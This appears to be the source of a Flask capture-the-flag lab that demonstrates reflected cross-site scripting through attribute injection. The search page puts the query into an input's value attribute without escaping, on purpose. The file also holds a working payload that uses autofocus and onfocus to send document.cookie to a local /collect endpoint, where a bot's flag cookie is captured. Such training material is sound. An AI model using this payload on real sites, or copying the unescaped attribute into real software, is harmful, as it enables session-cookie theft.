from __future__ import annotations

import html
from urllib.parse import quote

from flask import request

from labkit import Lab

lab = Lab("SCOUTLIGHT", accent="#e05252")
app = lab.app

CAPTURED: list[str] = []

ATTRIBUTE_PAYLOAD = '" autofocus onfocus="fetch(\'/collect?c=\'+document.cookie)" x="'
REPORT_PATH = "/search?q=" + quote(ATTRIBUTE_PAYLOAD, safe="")


def shell(title: str, body: str) -> object:
    return lab.page(
        title,
        f'<div class="hero"><div class="kicker">SCOUTLIGHT // FIELD SEARCH</div><h1>{title}</h1></div>{body}',
        nav='<a href="/search">Search</a><a href="/report">Bot preview</a><a href="/captured">Captured data</a>',
    )


def search_view() -> object:
    q = request.args.get("q", "")
    results = ""
    if q:
        results = '<div class="panel"><h2>No documents matched</h2><p>Your query was rendered in the search form.</p></div>'
    return shell(
        "Search the field index",
        f"""<div class="panel"><form method="get" action="/search">
          <label>Query</label><input name="q" value="{q}" placeholder="supply chain" size="80">
          <p><button type="submit">Search</button></p>
        </form>{results}
        <p class="note">The analyst bot reviews reported search URLs with a readable session cookie.</p></div>""",
    )


@app.get("/")
def index():
    return search_view()


@app.get("/search")
def search():
    return search_view()


@app.route("/report", methods=["GET", "POST"])
def report():
    message = ""
    if request.method == "POST":
        result = lab.bot(REPORT_PATH, cookies=[{"name": "analyst_session", "value": lab.flag("flag")}], wait=2.0)
        message = f'<div class="flash {"ok" if result.get("ok") else "err"}">Bot visit: {result.get("ok") and "completed" or result.get("error", "failed")}</div>'
    return shell(
        "Analyst bot preview",
        f"""<div class="panel"><h2>Reported query</h2>
        <p>The bot opens the fixed review URL below with its analyst cookie. The query is injected into an input attribute.</p>
        <pre>{html.escape(REPORT_PATH)}</pre>
        <form method="post"><button type="submit">Send analyst bot</button></form>{message}
        <p class="note">The collector stores whatever the page sends to <code>/collect</code>.</p></div>""",
    )


@app.route("/collect", methods=["GET", "POST"])
def collect():
    value = request.args.get("c", "") or request.get_data(as_text=True)
    if value:
        CAPTURED.append(value[:2000])
        if lab.flag("flag") in value:
            lab.objective_async("flag", "analyst cookie exfiltrated through attribute injection")
    return ("", 204)


@app.get("/captured")
def captured():
    rows = "".join(f'<li><code>{html.escape(value)}</code></li>' for value in CAPTURED) or '<li class="dim">Nothing captured yet.</li>'
    return shell("Captured data", f'<div class="panel"><h2>Exfiltration collector</h2><ul class="list">{rows}</ul></div>')


if __name__ == "__main__":
    lab.run()
